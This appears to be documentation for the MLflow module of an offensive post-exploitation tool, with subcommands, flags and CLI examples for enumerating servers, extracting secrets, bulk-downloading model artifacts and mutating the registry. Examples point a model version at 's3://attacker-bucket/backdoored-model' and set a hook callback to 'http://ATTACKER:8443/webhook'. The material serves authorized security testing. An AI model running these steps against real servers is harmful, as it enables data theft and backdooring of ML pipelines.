# MLflow

Enumerate and extract data from MLflow tracking servers.

## Overview

The `mlflow` module covers the full MLflow API surface: tracking metadata, experiment and run discovery, artifact inspection, model registry enumeration, model version correlation, bounded artifact reads, capped bulk artifact download, bounded artifact-store writes, gated write/registry mutation proofs, and registry-hook metadata installation.

The client uses GET requests for the model registry search endpoint (MLflow 2.x), with POST fallback for older versions. Health checks try the root path `/` first (MLflow 2.x returns "OK"), then `/health`.

## Subcommands

### Read-Only (no `--force-exploit` required)

| Subcommand | Description |
|---|---|
| `enum` | Tracking server metadata and version. Extracts sensitive params/tags from enumerated runs. |
| `experiments` | List experiments with run counts |
| `runs` | List runs for a specific experiment. Produces additional High-severity findings when a run's `artifact_uri` or parameters expose remote storage URIs (e.g. S3, GCS, Snowflake) or other sensitive patterns |
| `artifacts` | List artifact tree for a run |
| `registry` | List registered models |
| `model-versions` | List versions for a registered model |
| `model-artifacts` | List artifact paths for a specific model version. Extracts sensitive params/tags from the resolved run. |
| `download-artifact` | Download an artifact by path |

### Gated (requires `--force-exploit`)

| Subcommand | Description |
|---|---|
| `bulk-download` | Recursively download capped artifacts from a run or model version |
| `upload-artifact` | Write a bounded artifact to the proxied-artifact store via the real `mlflow-artifacts` REST API and confirm it by read-back. Proves unauthenticated write access to the artifact store (`impact`/`influenced`) — it does NOT prove a downstream model load or execution. |
| `tamper-proof` | Create a proof experiment, run, and parameter to demonstrate write access to the ML pipeline |
| `swap-model` | Register a new model version pointing to an operator-supplied artifact source |
| `hook` | Write a model-version hook URL tag and confirm downstream hook delivery when automation consumes it |

## Flags

| Flag | Required | Description |
|---|---|---|
| `--target` | Yes | MLflow server URL (e.g., `http://127.0.0.1:5000`) |
| `--header` | No | Custom HTTP headers. Repeatable. |
| `--experiment` | For `experiments`, `runs` | Experiment name or ID |
| `--limit` | No | Maximum items to return |
| `--run-id` | For `artifacts`, `download-artifact`, `bulk-download` | Run ID to inspect |
| `--artifact-path` | For `download-artifact`, `upload-artifact` | Artifact store path to download / write |
| `--artifact-content` | For `upload-artifact` | Base64-encoded content to write (capped at 256 KiB; default: a benign marker payload) |
| `--path-prefix` | For `artifacts`, `bulk-download` | Path prefix filter for artifact listing/download |
| `--model` | For `model-versions`, `model-artifacts`, `bulk-download`, `swap-model`, `hook` | Registered model name |
| `--version` | For `model-artifacts`, `bulk-download`, `hook` | Model version number |
| `--source` | For `swap-model` | Operator-controlled artifact URI to register as a new model version |
| `--callback-url` | For `hook` | Operator-controlled HTTP callback URL. The tool appends a nonce and listens for a matching callback. |
| `--tag-key` | For `hook` | Model-version tag key used for the hook URL (`aipostex.hook.url` by default) |
| `--max-files` | For `bulk-download` | Maximum artifact files to download |
| `--max-bytes` | For `bulk-download` | Maximum total bytes to download |
| `--per-file-bytes` | For `bulk-download` | Maximum bytes to read per artifact file |

## What each `landed` level means here

Findings carry a `landed` axis recording what actually landed on the target. MLflow tracking-server reads and writes are impact-only unless a separate serving/load path is observed; registry mutation does not by itself prove model execution.

| `landed` | What produces it in mlflow |
|---|---|
| `reachable` | `enum`, `experiments`, `runs`, `registry`, `model-versions`, and the top-level `artifacts` listing — the server responded and resources were enumerated, nothing read off it yet. |
| `influenced` | `tamper-proof` creates a proof experiment/run/parameter; `swap-model` creates a registry version pointing at the supplied source; `upload-artifact` writes an artifact to the proxied store, confirmed by read-back; `hook` writes verified model-version hook metadata without observed downstream delivery. These are confirmed state changes, not execution. |
| `read-confirmed` | Sensitive params/tags extracted from enumerated runs and model versions; `download-artifact` or `bulk-download` reading config/text/log/notebook/credential artifacts that do not by themselves prove model control. |
| `execution-confirmed` | Not emitted by the current MLflow tracking/registry verbs. Reserved for a separate serving/load verifier that observes a model actually being loaded or run. |
| `takeover-capable` | A downloaded artifact classified as model weights (`.pt`, `.bin`, `.safetensors`, `.onnx`, `.pkl`) or MLmodel metadata; or a `hook` whose nonce-matched callback proves downstream MLOps hook automation consumed attacker-controlled registry metadata. Served model execution still requires a separate serving verifier. |

## Operator console

After the verbs have proven a stage, the [`request`](../cli/request.md) verb (`aipostex mlflow … request METHOD PATH`) lets you issue any one-shot MLflow REST call by hand — reusing the module's `--target`/`--header` — and captures the response as a finding, mining it for loot. It is honest and modest: a bare request is Info severity and never claims impact. MLflow has no interactive `shell`; drive it one request at a time.

## Examples

```bash
# Enumerate server
./aipostex mlflow --target http://127.0.0.1:5000 enum

# List experiments
./aipostex mlflow --target http://127.0.0.1:5000 experiments --limit 5

# List runs for an experiment
./aipostex mlflow --target http://127.0.0.1:5000 runs --experiment demo --limit 5

# List artifacts for a run
./aipostex mlflow --target http://127.0.0.1:5000 artifacts --run-id run-1

# List registered models
./aipostex mlflow --target http://127.0.0.1:5000 registry

# List model versions
./aipostex mlflow --target http://127.0.0.1:5000 model-versions --model demo-model

# List artifacts for a model version
./aipostex mlflow --target http://127.0.0.1:5000 model-artifacts \
  --model demo-model --version 3

# Download a specific artifact
./aipostex mlflow --target http://127.0.0.1:5000 download-artifact \
  --run-id run-1 --artifact-path model/MLmodel

# Bulk download capped artifacts from a run (gated)
./aipostex mlflow --target http://127.0.0.1:5000 bulk-download \
  --run-id run-1 --path-prefix model --force-exploit

# Prove write access by creating experiment + run (gated)
./aipostex mlflow --target http://127.0.0.1:5000 tamper-proof --force-exploit

# Register a new model version pointing to a supplied artifact URI (gated)
./aipostex mlflow --target http://127.0.0.1:5000 swap-model \
  --model demo-model --source s3://attacker-bucket/backdoored-model --force-exploit

# Install hook metadata and confirm downstream controller delivery (gated)
./aipostex mlflow --target http://127.0.0.1:5000 hook \
  --model demo-model --version 3 \
  --callback-url http://ATTACKER:8443/webhook --force-exploit
```

## Workflow Progression

```
discover network (discovers MLflow on :5000)
  → mlflow enum (server metadata)
    → mlflow experiments (list experiments)
      → mlflow runs --experiment <name> (list runs)
        → mlflow artifacts --run-id <id> (browse artifact tree)
          → mlflow download-artifact --run-id <id> --artifact-path <path>
          → mlflow bulk-download --run-id <id> --path-prefix <path> (gated)
    → mlflow registry (list registered models)
      → mlflow model-versions --model <name>
        → mlflow model-artifacts --model <name> --version <v>
          → mlflow bulk-download --model <name> --version <v> (gated)
          → mlflow hook --model <name> --version <v> --callback-url <url> (gated)
  → mlflow tamper-proof (prove write access, gated)
  → mlflow swap-model (registry mutation, gated)
```

The module pivots from registry exposure into model-version correlation and artifact listing. `bulk-download` performs capped artifact exfiltration. `tamper-proof` proves tracking-server write access; `swap-model` proves registry mutation; `hook` proves a real MLflow model-version tag write and only upgrades when a separate MLOps controller actually delivers the nonce-scoped callback.
